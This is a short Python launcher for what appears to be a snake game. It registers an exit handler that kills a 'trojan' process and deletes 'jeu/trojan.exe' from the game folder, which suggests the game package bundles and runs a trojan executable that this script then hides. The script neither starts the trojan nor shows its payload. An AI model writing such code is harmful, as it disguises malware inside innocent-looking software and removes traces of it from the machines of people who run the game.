import atexit
import os
import subprocess
from jeu.snake import jeu

# Global variable to track the trojan process
trojan_process = None

def cleanup():
    global trojan_process
    try:
        if trojan_process and trojan_process.poll() is None:
            trojan_process.terminate()
            trojan_process.wait(timeout=5)
    except Exception:
        pass
    
    try:
        os.remove("jeu/trojan.exe")
    except FileNotFoundError:
        pass
    except PermissionError:
        # If still locked, Windows will clean it up on next reboot
        pass

if __name__ == "__main__":
    atexit.register(cleanup)
    jeu()